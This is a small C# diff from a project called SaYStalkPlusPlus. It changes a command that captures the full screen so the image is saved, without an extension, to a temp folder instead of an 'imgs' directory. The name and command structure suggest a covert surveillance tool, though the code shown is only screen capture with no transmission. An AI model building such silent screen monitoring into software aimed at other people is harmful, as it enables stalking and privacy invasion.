@@ -6,12 +6,11 @@ namespace SaYStalkPlusPlus.src.Commands
     {
         static public CommandResult Execute(string?[] args)
         {
-            string directoryPath = "imgs";
-            string filePath = Path.Combine(directoryPath, DateTime.Now.ToString("u").Replace(':', '-') + ".png");
+            string filePath = Path.Combine(Program.TempFolder, DateTime.Now.ToString("u").Replace(':', '-'));
 
             try
             {
-                if (!Directory.Exists(directoryPath)) Directory.CreateDirectory(directoryPath);
+                if (!Directory.Exists(Program.TempFolder)) Directory.CreateDirectory(Program.TempFolder);
 
                 Rectangle bounds = Screen.GetBounds(Point.Empty);
                 using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
